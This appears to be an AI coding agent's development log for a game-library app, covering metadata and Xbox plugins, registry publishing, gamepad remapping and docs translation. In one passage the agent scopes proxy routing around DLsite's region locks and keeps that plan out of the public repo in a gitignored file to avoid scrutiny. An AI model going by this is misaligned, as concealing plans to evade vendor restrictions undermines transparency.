curated vocabulary (plot elements, structure, content warnings, and genre-ish tags all mixed
together, easily dozens per title), not a small controlled genre list the way IGDB/RAWG/
TheGamesDB's genres are, so there's no principled way to pick a subset - recorded this as a
deliberate scoping decision in both the module doc comment and the README, same "skip a field
that doesn't cleanly fit" precedent `sgdb-metadata-wasm-plugin` already set for its own missing
fields, rather than force a bad mapping just to fill the field.

Added a small `bbcode_to_markdown` helper (hand-rolled `[b]`/`[i]`/`[url=..]` handling via
plain `find`/`split`, not a regex crate - the tag set is small and fixed, not worth a
dependency) since VNDB's `description` field uses its own lightweight BBCode-style markup,
confirmed via the same live API call (Steins;Gate's real description contains literal `[b]`/
`[url=...]` tags) - this app's own description field is documented as Markdown-rendered, so
passing VNDB's raw text through unconverted would show literal bracket syntax in the UI instead
of formatted text.

Verified with a real `cargo check` in the scaffolded repo (not cross-compiled to
`wasm32-wasip1`/`cargo component build`, but enough to catch real syntax/type errors) - caught
and fixed one real issue this way: an unused `title` field/fetch in `fetch_metadata_by_id`'s
response struct that `MetadataResult` never actually needed, removed rather than left as
dead-code-suppressed cruft. Pushed to `main`, which triggered the real `publish.yml` workflow
automatically (not just theoretically wired) - confirmed via `gh run watch` that it built,
signed, and published a real `v0.1.0` GitHub release with working `.wasm`/`plugin.json` assets.
Exactly one step failed as expected: "Notify concourse-plugin-registry," since the new repo
doesn't have the `REGISTRY_DISPATCH_TOKEN` secret configured yet (a manual one-time step the
user still needs to do in the new repo's own Settings → Secrets, same requirement every other
official plugin repo already has) - the release itself published successfully regardless, since
that notification step runs last and independently of the release-publish step succeeding.
Added VNDB's row to this main repo's `docs/guide/official-plugins.md` table, verified with a
real `docs:build`.

**Follow-up: closed the `REGISTRY_DISPATCH_TOKEN` gap and verified the full pipeline for real,
including a manual curated-registry addition.** User set the secret themselves, then asked to
check it and launch the workflow. Confirmed via `gh secret list` it was present, then
re-triggered `publish.yml` via `workflow_dispatch` - it no-op'd entirely (every step downstream
of "already published" skipped, since `v0.1.0` already existed), not a real retry. Rather than
force a version bump just to retrigger CI, manually fired the same `repository_dispatch` event
the skipped CI step would have sent (`gh api repos/.../concourse-plugin-registry/dispatches`),
using the session's own `gh` auth rather than the missing token - this is legitimate since the
session is authenticated as the repo owner, not a workaround of anything access-control-related.

That dispatch hit a real, expected wall: `concourse-plugin-registry`'s own `bump-entry.sh`
explicitly refuses to create new entries (`"FAIL: no existing registry.json entry with id ==
vndb-wasm (not adding new entries automatically)"`) - by design, matching the curated-registry
model's own "hand-reviewed, not auto-added" description already in this repo's README. So added
the first entry by hand: computed the real `wasmSha256` by downloading and hashing the actual
published `v0.1.0` asset directly (not trusting a self-reported hash, same discipline
`bump-entry.sh` itself uses), matched the exact schema of the existing 11 entries, and opened it
as a real PR (`concourse-plugin-registry#17`) against that repo's branch-protected `main` -
confirmed `Validate Registry`'s CI check passed before merging, rather than assuming the JSON
was well-formed.

User then asked to bump the plugin "just in case" - a real end-to-end pipeline verification,
not a functional change. Bumped `0.1.0` → `0.1.1` in both `Cargo.toml` and `plugin.json`, `cargo
check` clean, pushed. This time every step succeeded including the registry notification -
confirmed via `gh run watch` on both repos. The resulting auto-bump PR
(`concourse-plugin-registry#18`) surfaced one more real, previously-unseen wrinkle: its
`Validate Registry` check came back `action_required`, not `queued`/`pending` - GitHub gates
workflow runs on PRs from certain actors (here, a PR opened by `github-actions[bot]` via the
automated bump workflow) behind manual approval by default. Approved it via `gh api .../
actions/runs/.../approve`, watched the check pass for real, then merged - confirmed the final
registry entry now points at `v0.1.1` with a freshly recomputed hash, not left stale.

**Follow-up: researched SteamDB and DLsite as possible future metadata-plugin candidates -
declined SteamDB outright, scoped DLsite as a private, unstarted stretch milestone.** User asked
about SteamDB first - checked their own FAQ directly rather than assuming a game-data site would
be fine to build against, and it explicitly states "please don't scrape us," with no public API
at all (their own data comes from Steam's official APIs/store pages anyway) - declined that one
outright rather than building a scraper against an explicit stated policy.

User then asked about DLsite. Real, non-obvious answer this time, not a clean yes/no like
SteamDB: no explicit anti-scraping policy exists (checked `robots.txt` - permissive, only
specific paths disallowed, no blanket block on product pages; and the real ToS page at `/home/
guide/copy`, "Copyright and Unauthorized Access," fetched and read in full - it covers
reproducing DLsite's own page content and piracy/unauthorized product acquisition specifically,
neither of which squarely addresses automated reading of public listing metadata). But DLsite
also has no official API to build against - two community libraries (`dlsite-async`,
`dlsite-rs`) exist, both working against an undocumented internal endpoint or raw HTML, neither
sanctioned. Explained this distinction directly when asked - SteamDB is an explicit-prohibition
case, DLsite is a "genuinely unaddressed, judgment call" case, not equivalent risk levels.

User then flagged a real, specific detail from their own knowledge: some DLsite content is
region-locked to Japan-based IPs, meaning a hypothetical DLsite plugin might need proxy/VPN
routing support for full metadata parity - and asked for this to be scoped in `milestones.md`
as unofficial/stretch, but moved to a private, gitignored doc if that framing "could cause
trouble" in a public repo. Judged that it could: "this app may help route around a vendor's
geographic access restriction" reads very differently out of context than every other metadata
plugin's "fetches from a documented API," even though the actual use case (a user's own library
app showing metadata for games they already access) isn't remotely piracy-adjacent - better to
keep that reasoning available but not sitting bare in a public repo. Added a deliberately
high-level Milestone 23 entry to the tracked `milestones.md` (no ToS/proxy/region detail, just
"no official API, see private notes") and moved the full research - the robots.txt/ToS findings,
the region-restriction/proxy angle and why it's sensitive, and the real open questions before
this could ever start - into a new `.claude/dlsite-plugin-notes.md`, added to `.gitignore`
immediately (confirmed via `git status` that it doesn't show as trackable) rather than
committed and removed after the fact. Nothing beyond this notes file and the milestone
placeholder exists - no code, no scaffolding, explicitly left unstarted.

## Milestone 7 — Polish & Extras — post-close addition

**Made `standard-gamepad`'s controller mapping user-configurable, then added an `8bitdo-micro`
plugin and generalized the binding model to axis-driven inputs.** Several requests in sequence,
each surfacing a real gap the previous step didn't cover:

1. User asked to make the built-in `standard-gamepad` plugin configurable. Added a
   `settingsComponent` (the existing per-plugin settings-UI hook every plugin kind already
   supports) with a remap modal: click "Listen," press a real button, its index gets captured
   live via a `requestAnimationFrame` gamepad poll. Persisted as a per-plugin override in
   `useControllerMappingStore` (`controller_mapping_override_<id>` setting, merged on top of the
   plugin's own default `mapping`) rather than editing the plugin's shipped default in place.
2. User reported raw button indices were hard to read. Added a name lookup (`buttonNames.ts` -
   A/B/X/Y/LB/RB/LT/RT/Back/Start/LS/RS/D-Up/Down/Left/Right/Home, per the Gamepad API's
   "standard" mapping) and a live physical-layout diagram (CSS grid, rough top-down controller
   shape) highlighting whichever button is actually pressed while the modal is open - doubles as
   a "which index is this" reference during remapping, not just a static legend.
3. User asked "can it be detached" re: WASM/multi-controller support in general, specifically
   naming the 8BitDo Micro. Researched via web search - no verified public Gamepad API index
   table exists for that device (Bluetooth-only, indices shift by connection mode/OS). Rather
   than guess and ship wrong numbers as fact: extracted the remap modal into a reusable
   `GamepadRemapSettings.vue` (props: `pluginId`, `defaultMapping`, `hasSticks`) so
   `standard-gamepad` and a new `8bitdo-micro` plugin share one implementation; the new plugin
   ships every button unbound, letting a user's real hardware fill in the truth via Listen.
4. User tested their actual Micro with a third-party gamepad tester and found its d-pad reports
   as joystick axis crossings, not four buttons - explaining why remapping it produced nothing.
   The `GamepadMapping` type only supported plain button indices, with no way to represent that.
   Fixed by introducing `GamepadDirectionBinding` (initially `{ button?, axisInput? }`, letting
   either fire) and updating both `useGamepadNav`'s `isDirectionActive` and the remap capture
   loop to detect a newly-crossed axis (edge-detected the same way as a newly-pressed button,
   not just a raw threshold check) in addition to a button press. Added a live axis-value
   readout to the modal so a user can see which axis number moves.
5. User asked directly whether the binding held both input types simultaneously or one at a
   time - it held both (by design, `standard-gamepad`'s default set both a button *and* an axis
   fallback for each direction), but the remap UI's Listen always captured and wrote only one,
   silently leaving the other stale. User asked to make it an explicit `button | axisInput |
   null` union instead. Replaced `GamepadDirectionBinding` with a real discriminated union
   (`GamepadButtonBinding | GamepadAxisBinding | null`, tagged via a `kind` field) - a direction
   is now unambiguously bound to exactly one source or unassigned, matching what a single
   Listen capture actually observes. Traded away `standard-gamepad`'s previous implicit
   button+axis dual default in the process (a real behavior change, called out to the user
   rather than silently dropped) - its left-stick navigation isn't bound by default anymore
   unless a user explicitly remaps a direction onto it.
6. User asked to apply the same binding type to confirm/cancel, which had stayed plain button
   indices while d-pad directions already got the flexible type - inconsistent, and wouldn't
   have supported a pad reporting an analog trigger as an axis for confirm/cancel either.
   Unified all six mapped inputs (4 directions + confirm + cancel) onto one
   `GamepadDirectionBinding` shape and one remap code path in `GamepadRemapSettings.vue`
   (`ACTIONS` replacing the earlier separate `DPAD_ACTIONS`/`BUTTON_ACTIONS` split);
   `useGamepadNav`'s confirm/cancel edge-detection now goes through the same
   `isDirectionActive` helper the d-pad uses.

Each step was verified with `bun run build` (typecheck + production build) before committing -
no GUI/hardware testing possible in this environment, so the user validated steps 1-4 with
their own real controllers between requests.

**Implementation.** User picked up the scoped work: same 10 locales as the app, machine-
translated (both confirmed via `AskUserQuestion` rather than assumed). `docs/.vitepress/config.ts`
rewritten with a `locales` key - `root` (English) plus 9 entries keyed by lowercase URL segment
(`ko`, `ja`, `zh-hans`, `es`, `fr`, `de`, `pt-br`, `ru`, `it` - lowercase per VitePress's own URL
convention, even though `zh-Hans`/`pt-BR` keep their original casing in each entry's `lang`
attribute, matching the app's own `messages` keys in `src/i18n/index.ts`), each with its own
translated `nav`/`sidebar` `themeConfig` pointing at that locale's link-prefixed paths. Root's
previous top-level `nav`/`sidebar` moved into `locales.root.themeConfig` unchanged; `socialLinks`/
`search` stayed at the shared top-level `themeConfig` since they're identical across locales.

**Translation execution**: spawned 9 parallel background `general-purpose` agents, one per
locale, each translating the same 13 source files (`docs/index.md` + 5 under `docs/guide/` + 7
under `docs/plugins/`) into its own `docs/<locale>/` tree - independent, non-overlapping file
sets, so full parallelism was safe. Each agent's brief: translate prose/headings only, leave code
fences/inline code/file paths/frontmatter keys untouched, and rewrite the two known absolute
`/plugins/` links (in `guide/index.md` and `guide/plugins-and-themes.md`) to `/<locale>/plugins/`.
117 files landed (13 × 9), all agents reporting back their own terminology judgment calls (mostly
"which UI-label/technical nouns to leave in English for a dev audience that sees the literal
string in the app or an API").

**Two real bugs found post-generation, not covered by any agent's brief:**
1. **Cross-page anchor links break once headings are translated.** VitePress's `markdown-it-
   anchor` slugifies a heading's *own* rendered text into its anchor id - six sections
   (`URI launches vs. direct executables`, `Playtime Tracking`, `Deduplication across sources`,
   `Offline translation` in `guide/library.md`; `Versioning` in `plugins/manifest-reference.md`;
   `Path scoping` in `plugins/security-model.md`) are linked *from other pages* by their English
   slug (e.g. `./library#playtime-tracking`), but a translated heading generates a translated
   slug instead, silently breaking the jump-to-anchor. Most agents left the *link fragments*
   in English (correctly matching the untranslated-anchor assumption they weren't told was
   false) while translating the *headings* themselves (invalidating that same assumption) - an
   inherent contradiction the per-locale brief didn't anticipate, since it only called out the
   two `/plugins/` link rewrites and said nothing about anchor stability. One agent (pt-BR)
   independently noticed the mismatch and translated the fragments to match its own translated
   slugs instead, which fixed pt-BR internally but left it inconsistent with every other locale's
   convention. Fixed uniformly across all 9 locales post-generation: added an explicit
   `{#english-slug}` id to each of the six headings (VitePress/markdown-it-anchor supports this
   directly in the heading line), then reverted pt-BR's six fragment links back to the same
   English ids every other locale already used - one stable id per section, independent of
   translated heading text, matching what the untouched relative-link agents had already assumed.
2. **Two locale index.md frontmatter files failed to parse.** `docs/ko/index.md` and
   `docs/pt-br/index.md` each had one `details:` value containing a literal `:` inside translated
   prose (Korean "예:", Portuguese "ex.:") - valid English YAML because the original text had no
   inner colon, but the translated string turned a plain scalar into what YAML read as a second,
   malformed mapping key. `bun run docs:build` caught it immediately (`incomplete explicit
   mapping pair`) since VitePress fails outright on frontmatter parse errors rather than silently
   dropping the field. Fixed by quoting both values.

**Verification**: `bun run docs:build` (VitePress's own build, which fails on both frontmatter
errors and dead links by default via `ignoreDeadLinks: false`) ran clean after both fixes above -
confirms the full 10-locale, ~130-page site builds, and that no internal link (including the
anchor-id fixes) is dead. `.github/workflows/docs.yml` needed no changes - it already just runs
`bun run docs:build` and uploads `docs/.vitepress/dist` as a Pages artifact, agnostic to how many
locale subdirectories exist inside it.

Per `milestones.md`'s own preamble, this milestone's close is what triggers the 1.x → 2.0.0
version bump - not done automatically as part of this pass (bump/tag/push stays a separate,
explicitly-requested step per this project's standing convention).

## Milestone 24 — Detachable Controller Mapping Plugins

User asked, after the above work, whether `standard-gamepad`/`8bitdo-micro` - still build-time-
bundled TS plugins - could be "detached" the way source/metadata/wrapper plugins already are
(separate repo, install-by-URL, independent versioning/updates).

Answered directly rather than treating it as a quick toggle: two detach paths exist today, and
neither currently covers the `controller` kind.
- **WASM runtime** (`source`/`wrapper`/`metadata`) - built for plugins with real behavior
  (`scan()`/`launch()`/`fetchMetadataById()` etc.) needing a sandboxed execution environment.
  Overkill for a controller mapping, which is pure data.
- **Data-only runtime** (`theme` only, Milestone 16) - `plugin_installer.rs`'s
  `DataThemeManifest` struct and `list_data_themes`/`install_data_theme`/`uninstall_data_theme`
  commands, install-by-URL, zero code execution. A controllers's `GamepadMapping` is exactly
  this shape (data, no behavior) - the natural fit - but the existing structs/commands are
  theme-shaped specifically (`cssVariables`/`cardVisual`/`fontFaces` fields), not generic, so
  reusing this tier for `kind: "controller"` is real new backend + frontend work, not a flag.

Scoped as Milestone 24 in `milestones.md` rather than started immediately - genuine new surface
area (new Rust struct/commands, `loader.ts` wiring, `PluginSettings.vue`/`AddPlugin.vue` install-
flow support for the Controller tab, eventually a new `data-controller-plugins` repo mirroring
`data-theme-plugins`, and a `concourse-plugin-registry` `kind: "controller"` extension - same
precedent Milestone 16 set for `kind: "theme"`). Left unstarted pending the user's go-ahead.

**Implementation**, same session as the ARC Raiders stripe-gap tweak and the sticky-background
`background-attachment: fixed` switch above. First did an unrelated cosmetic ask -
`GamepadRemapSettings.vue`'s live button diagram redrawn from plain CSS-grid boxes into an SVG
gamepad silhouette with percentage-positioned round/pill/stick hitzones (`PAD_POSITIONS`,
hand-placed Xbox-style asymmetric coordinates, not screenshot-verified in this environment) -
then moved on to M24 itself.

**Rust (`plugin_installer.rs`)**: `DataControllerManifest` mirrors `DataThemeManifest` exactly
in shape/reasoning - `mapping` is `serde_json::Value` (opaque, never Rust-interpreted, same
arm's-length treatment as `card_visual`/`font_faces`), `has_sticks` defaults `true`. `detect_kind`
gained a `"controller"` arm (previously any manifest declaring it errored - the existing test
`detects_source_theme_and_unsupported_kinds` explicitly asserted that rejection, renamed and
flipped to assert acceptance instead). `install_data_controller`/`list_data_controller_mappings`/
`uninstall_data_controller_mapping` are near-identical copies of the theme equivalents, storing
under `<app data>/data-controllers/<id>/controller.json`. `install_plugin`'s branch extended
with a `kind == "controller"` arm before the `theme` fallback. 3 new tests (real HTTP round-trip
install/list/uninstall, a null-mapping rejection) all pass; full `cargo check`/`cargo test` clean
(12 tests total including the pre-existing WASM one).

**Frontend**: `PluginManifest` gained `mapping?: unknown`/`hasSticks?: boolean` (Milestone 24
data fields, mirroring `cssVariables`'s doc-comment convention exactly). `loader.ts` gained
`getInstalledDataControllerManifests` (merged into `getAvailablePluginManifests` alongside the
WASM/data-theme tiers already there) and `createDataControllerMappingPlugin` - the one place this
tier differs structurally from data-themes: a data-only *theme* manifest is inert data consumed
directly by `theme.ts`, but a controller mapping's settings UI (`GamepadRemapSettings.vue`) is
normally attached by the plugin's own `index.ts` (`standard-gamepad`/`8bitdo-micro` both do this
today) - a manifest with no `index.ts` has nothing to do that attaching, so `loader.ts` itself
attaches the shared component now, for every data-installed controller regardless of origin.
Added `normalizeGamepadMapping` to narrow a remote manifest's untrusted `mapping` JSON into a
real `GamepadMapping` - defaults every direction binding to `null` (unassigned) rather than
trusting an unexpected shape, matching `8bitdo-micro`'s own "ship null, let Listen capture the
real hardware value" philosophy rather than presenting a guess as fact.

`controllerMapping.ts` gained `refreshManifests()` (extracted from `init()`, same shape as
`theme.ts`'s) and `uninstallDataMapping(id)` (falls back to `standard-gamepad` if the uninstalled
mapping was active, mirrors `uninstallDataTheme`'s fallback-to-default pattern).
`pluginInstall.ts`'s `confirmInstall()` gained a `kind === "controller"` branch calling the new
`refreshManifests()`. `PluginSettings.vue`'s Controller tab gained the same
`v-if="manifest.runtime === 'data'"` uninstall button the Theme tab already had (previously
entirely missing - a real gap, not by design) - renamed the shared CSS class from
`.uninstall-theme` to `.uninstall-plugin` in the process, since it's no longer theme-specific.
Also fixed a stale comment claiming "controller mappings are always build-time TS," no longer
true. New i18n keys `pluginSettings.removeControllerMapping`/`removeControllerMappingFailed`
added across all 10 locales, mirroring `removeTheme`/`removeThemeFailed`'s existing phrasing per
language. `bun run build` (typecheck + production build) clean throughout.

**New repo**: [`data-controller-plugins`](https://github.com/smh0505/data-controller-plugins),
structure/CI copied from `data-theme-plugins` almost verbatim (`scripts/validate.mjs` adapted for
the mapping/hasSticks shape instead of cssVariables; `publish.yml` identical mechanics - validate
-> stage-renamed-manifests -> Sigstore attestation -> one stable `mappings` release tag ->
registry dispatch). `8bitdo-micro` migrated out as the first real entry (all-null bindings,
`hasSticks: false` - nothing hardware-specific was lost, since it never shipped real guessed
indices to begin with) and removed from `src/plugins/8bitdo-micro/` entirely. `standard-gamepad`
deliberately stays built-in - it's `controllerMapping.ts`'s own `DEFAULT_MAPPING_ID`/fallback
baseline (the documented Gamepad API "standard" mapping), not a candidate for detachment the way
a specific third-party pad's real-world quirks are.

**Registry extension**: added a `kind: "controller"` entry for `8bitdo-micro`
(`concourse-plugin-registry#31`) - hash independently verified against both the published GitHub
Release asset and the commit-pinned raw.githubusercontent.com URL before pinning, same discipline
every other registry addition this project has used. Caught two real bugs the new kind exposed
immediately, via the PR's own CI rather than shipping broken: `validate.sh` and `bump-entry.sh`
both special-cased `kind == "theme"` as the *only* data-only (no-sibling-.wasm) path - a
`controller` entry fell through to the WASM-artifact branch, tried to read a manifest field
(`entry`) that doesn't exist on a data-only manifest, built a URL to a nonexistent sibling file,
and hashed a 404 response instead of the real manifest. Both scripts now treat `theme` and
`controller` identically as data-only kinds (validate.sh's hash check; bump-entry.sh's
content-dir selection, `themes/` vs `mappings/`).

**Post-close: `GamepadRemapSettings.vue` diagram/UI polish pass**, requested right after M24
closed, iterated over many small rounds - full history in git log, summarized here rather than
per-iteration.
- Replaced the plain CSS-grid box layout with an SVG gamepad silhouette. First attempt was a
  hand-drawn bezier path (rejected, "ugly"); second attempt traced a user-provided reference
  image by eye (still off); landed on reusing `@tabler/icons-vue`'s real `device-gamepad-2`
  filled icon's own outer body path instead (MIT, already a project dependency) - a
  professionally-drawn shape beats hand-tracing. Its native 24x24 viewBox was first cropped
  tight to the shape's bounding box to kill empty top/bottom margin, then loosened slightly
  after the tight crop clipped the grips' corner-rounding arcs (they bulge past their nominal
  endpoints). `PAD_POSITIONS` (every button's %-placement) got rescaled twice to track each
  viewBox change, then iterated further per direct feedback: Back/Home/Start centered between
  the shoulder pairs; the face-button diamond recentered on the left stick's own y and its
  Y-to-A span narrowed to match the d-pad's Up-to-Down span; the d-pad recentered on the right
  stick's own y; both sticks' y raised/adjusted by feel across several rounds.
- D-pad direction labels on the diagram swap to `IconArrowUp/Down/Left/Right` instead of text
  ("D-Up" etc.) - sidesteps a translation question for that one case entirely. This followed a
  brief detour: an i18n pass first added a `gamepadRemap.buttonNames` translation layer for all
  word-based physical labels (Back/Start/Home/D-Up/...), then got partly reverted per feedback -
  physical hardware legends read better as plain literals (same reasoning A/B/X/Y/LB/RB already
  got), with the d-pad four specifically becoming icons rather than text of either kind.
- Along the way, found a real, unrelated i18n gap while investigating: the entire
  `gamepadRemap` i18n namespace only ever existed in `en.json` - every other locale silently
  fell back to English for the whole modal (title, listen state, action labels, tuning fields,
  reset button) since `fallbackLocale: "en"` masked the gap instead of erroring. Translated the
  full section into all 9 other locales.
- Added stick-tilt "lights": four `IconChevronCompactUp/Down/Left/Right` per stick, dim by
  default, lighting up in `--color-accent` when that stick tilts past the remap threshold in
  that direction - reads directly off the existing live `axisValues` (no polling-loop changes),
  assuming the Gamepad API standard mapping's axes 0/1 = left stick, 2/3 = right stick. Their
  offset-from-stick and stretch-scale were both tuned by feel across several rounds (final:
  offset 8, scale 2.4, stretched perpendicular to each chevron's own point direction so
  left/right read taller and up/down read wider). The offset itself needed an actual bug fix
  along the way: `.pad-silhouette`'s box is 24x18, not square, so an equal *percentage* offset
  on both axes was NOT an equal physical gap - the vertical offset now scales by the same 24/18
  ratio the viewBox itself uses.
- The raw per-axis numeric readout (debugging aid, not needed open by default) moved twice: first
  collapsed behind a "See more"/"See less" toggle inline under the diagram, then per feedback
  moved onto the modal's own title row (`BaseModal`'s `#header` slot), then finally turned into
  an actual popup using the shared `DropdownMenu.vue` shell (same trigger+panel+backdrop-close
  shape `GameDetail.vue`'s translate menu and `AppSettings.vue`'s model picker already use)
  right-aligned to its trigger via `:deep(.axis-menu-panel)`, instead of an inline expansion.
- One real regression scare mid-pass: gamepad input briefly stopped registering in the remap
  modal. Diffed every script-logic line (`pollGamepad`/`onOpen`/`onClose`) across every commit in
  this pass and confirmed byte-for-byte no capture logic had changed - turned out to be stale
  Vite HMR state in the dev server, fixed by a full restart, not a real code bug.

**Post-close: manifest-configurable `layout`/`silhouette`.** After the diagram polish pass
above, user asked to make the diagram's own button positions and body shape manifest-driven
too, not just the remap *bindings* - specifically calling out that a manifest, not some future
UI control, should own which physical gamepad button ids the diagram draws and where.

Two new optional fields on `DataControllerManifest` (Rust) / `PluginManifest` (TS), both opaque
passthrough exactly like `mapping` already is - the host never interprets them, only stores/
round-trips them:
- `layout: GamepadLayoutButton[]` - `{index, x, y, shape}` entries. `index` stays the same real
  Gamepad API standard-mapping index `mapping`'s own bindings already use (doesn't invent a new
  indexing scheme) - this only controls which of those indices get drawn on the diagram, and
  where. Declaring `layout` at all replaces the component's own built-in default layout
  entirely (not a merge), on the assumption a manifest author placing any buttons is placing all
  the ones they care about.
- `silhouette: {viewBox, path}` - a custom SVG controller-body outline replacing the diagram's
  own built-in `@tabler/icons-vue` shape. Both fields required together, since a path's
  coordinates are meaningless without knowing its own viewBox.

`GamepadRemapSettings.vue` gained `normalizeGamepadLayout`/`normalizeGamepadSilhouette` in
`loader.ts` (same untrusted-JSON narrowing pattern `normalizeGamepadMapping` already
established - drop malformed entries rather than trusting a stray shape), and two new computed
values (`padPositions`, `effectiveSilhouette`) that pick the manifest-supplied value when
present, else the component's own existing built-in default (kept as `DEFAULT_PAD_POSITIONS`/
`DEFAULT_SILHOUETTE`, the exact values from the polish pass above, so `standard-gamepad`/
`8bitdo-micro` render identically to before with zero manifest changes needed). One real design
wrinkle this surfaced: the stick-light Y-offset scaling and the container's own CSS
`aspect-ratio` were both hardcoded against the built-in silhouette's fixed 24x18 box - a custom
silhouette with a different box shape needed that scaling to track its *own* viewBox instead, so
both now derive from a `padShapeAspect` computed that parses the effective silhouette's viewBox
attribute at runtime rather than assuming a constant.

Data-controller-plugins' own `scripts/validate.mjs` extended to shape-check both new optional
fields (array/object structure, required sub-fields) the same way it already checks `mapping`'s
bindings, and its README documents the new schema. 4 new Rust tests (both fields round-trip
through install→list; both stay genuinely optional, a manifest with neither still installs
fine) alongside the existing 9 `plugin_installer.rs` controller/theme tests, all passing.

## Milestone 15 — Additional Source Plugins: Xbox/EA/Ubisoft (stretch) — research

Ranged over several requests: brainstormed what else could go into `milestones.md` (M25-37
recorded separately), which touched on M15's still-unstarted Xbox/EA/Ubisoft plugins - user
doesn't use any of the three, asked what to download free for an end-to-end test, then asked to
actually research each platform's real install-detection/launch format before writing any code
(same discipline `steam.rs`/`epic.rs`/`gog.rs` were built against - verified real manifests, not
assumption).

**Free test candidates recommended** (client + a real free game to install per platform):
Xbox app + Halo Infinite (multiplayer-only install, ~20-25GB, free-to-play); EA app + Apex
Legends (~75-90GB - EA's only real permanent free-to-play title on EA app currently, no smaller
free EA game under 10GB exists that's known); Ubisoft Connect + Brawlhalla (~1-2GB, by far the
lightest of the three). Noted client apps themselves are all ~1-2GB.

**Research findings, via `WebSearch` (community-sourced - forums, GitHub reverse-engineering
repos, Ubisoft's own support docs - not yet verified against real files on this machine, unlike
the Steam/Epic/GOG parsers which were built and tested against real manifests):**

- **Xbox app**: detection via installed AppX packages (`Get-AppxPackage` PowerShell, or registry
  `HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\
  Repository\Families\{PackageFamilyName}`) plus the package's own `appxmanifest.xml` inside the
  install folder. Launch is genuinely different from the other three - `explorer.exe
  shell:appsFolder\<PackageFamilyName>!<AppId>`, not a `://` URI scheme at all. `launcher.rs`'s
  existing `://`-substring branch (built for Steam/Epic) wouldn't catch this - Xbox would need
  its own launch-mechanism branch, a real architectural difference worth flagging before
  starting implementation, not something to force into the existing URI path.
- **EA app**: detection via `.mfst` manifest files under `C:\ProgramData\Origin\LocalContent\
  <GameFolder>\` (fields include `AppName`/`InstallLocation`), or registry `HKEY_LOCAL_MACHINE\
  SOFTWARE\Wow6432Node\Origin Games\<contentID>`. Launch via `origin2://game/launch/
  ?offerIds=<contentID>` (optionally `&cmdParams=...` for launch args, relevant to Milestone
  31's per-game launch-args idea too) - a real `://` URI, fits the existing `openUrl()` branch
  already used for Steam/Epic directly, no new launch mechanism needed.
- **Ubisoft Connect**: detection via registry `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\
  Ubisoft\Launcher\Installs\<gameID>\InstallDir` for the install path, with the display name
  resolved separately from the matching `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\
  Windows\CurrentVersion\Uninstall\UPlay Install {gameID}` key's `DisplayName` value (the
  install-dir key alone doesn't carry the game's name). The per-game `uplay_install.manifest`
  file itself is binary, not text/JSON/YAML - GZIP-compressed protobuf data starting at a fixed
  byte offset, and the protobuf schema isn't public (the client is VMProtect-packed, blocking
  static extraction; someone would need to dump a running instance's memory to recover it) - not
  realistically parseable, so the registry path above is the practical detection route instead,
  same shape as how GOG's existing registry-based detection already works in this codebase.
  Launch via `uplay://launch/<gameID>/0` (`0`/`1` selecting single-/multiplayer mode where a game
  has both) - also a real `://` URI, same `openUrl()` pattern.

Recorded directly in `milestones.md`'s M15 checklist (marked the three research items `[x]`,
each carrying the "community-sourced, not yet verified" caveat inline) rather than only here,
since the short-form finding is scannable enough to belong in the tracked checklist itself, not
just prose in this file - added a new unchecked verification item ("verify all three findings
against real installed games") so the checklist honestly reflects that this is research, not
confirmed fact, until the user actually installs the three recommended test games and checks
these paths/formats against reality.

## Milestone 15 — Xbox Source Plugin: Built and Published

User already had both the Xbox app (`Microsoft.GamingApp`) and Minecraft (`MinecraftUWP`/
`MinecraftJavaEdition`) installed - checked via `Get-AppxPackage` directly rather than assuming
a download was needed. Used Minecraft as the real verification target for everything below,
same "verify against a real file before writing a parser" discipline as Steam/Epic/GOG.

**Verified the real manifest first.** Read Minecraft's actual `AppxManifest.xml` directly
(`C:\Program Files\WindowsApps\Microsoft.MinecraftUWP_.../appxmanifest.xml`, readable without
extra elevation) - confirmed the structure the earlier research predicted:
`<Application Id="Game" Executable="GameLaunchHelper.exe">`, and an `ms-xbl-35760c07` /
`ms-xbl-multiplayer` `windows.protocol` registration. Test-launched via `explorer.exe
"shell:appsFolder\Microsoft.MinecraftUWP_8wekyb3d8bbwe!Game"` to confirm the launch mechanism
works for real (user confirmed Minecraft opened).

**Found the real detection path is registry, not `HKEY_CLASSES_ROOT` as first assumed.** The
`AppModel\Repository\Packages` key (which holds each package's `DisplayName`/
`PackageRootFolder`) doesn't exist under `HKLM` at all, and doesn't merge into `HKCR` the way
some online references implied - it's real and enumerable at
`HKCU\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\
Repository\Packages\<PackageFullName>`, confirmed directly via `Get-ItemProperty` against
Minecraft's real registry entry. This matters architecturally: the WASM host's
`read-registry-string`/`list-registry-keys` primitives only support `HKLM`/`HKCU` hives (never
`HKCR`), so if the real data had only lived under `HKCR` a new host primitive would have been
needed - it doesn't, so the existing generic primitives cover Xbox detection with zero new WIT
functions. `PackageFamilyName` (needed for the launch string) isn't stored anywhere in the
registry directly either - derived from `PackageFullName` by splitting on `_` and taking the
first field (Name) and last field (PublisherId), verified against Minecraft's real values
(`Microsoft.MinecraftUWP_1.26.4201.0_x64__8wekyb3d8bbwe` -> `Microsoft.MinecraftUWP_8wekyb3d8bbwe`,
matching `Get-AppxPackage`'s own `PackageFamilyName` output exactly).

**The one real host-side change: a new `request-read-scope` validator.** Reading a package's
`AppxManifest.xml` needs read access outside the plugin's own `plugin-dir()`, and
`PackageRootFolder` isn't knowable ahead of time (varies per install) - same situation Steam's
already in. Added an `"xbox-wasm"` arm to `wasm_plugins.rs`'s `do_request_read_scope` match,
checking for an `AppxManifest.xml` file in the requested directory (mirrors Steam's
`steamapps` subdirectory check) - `cargo check` clean. This was the only main-repo Rust change
needed; `spawn-process`/`read-file`/`list-registry-keys`/`read-registry-string` all already
existed and needed no modification.

**The filtering problem: distinguishing games from the hundreds of system UWP packages.** The
`Packages` registry key lists every installed AppX package on the system - Calculator, Photos,
Cortana, etc., not just games. Real Microsoft Store games without a bespoke local manifest
have no dedicated "is a game" flag exposed locally, so used Minecraft's own `ms-xbl-*`
`windows.protocol` registration (Xbox Live title-specific protocol IDs) as the filtering
signal - a genuine, verified-present-on-a-real-game / verified-absent-on-system-apps heuristic,
documented explicitly as a heuristic (not an authoritative flag from Microsoft) in both the
plugin's own README and its module doc comment, since a hypothetical Store game without Xbox
Live integration would be missed by it.

**Built `xbox-source-wasm-plugin`** (new repo, `smh0505/xbox-source-wasm-plugin`), following
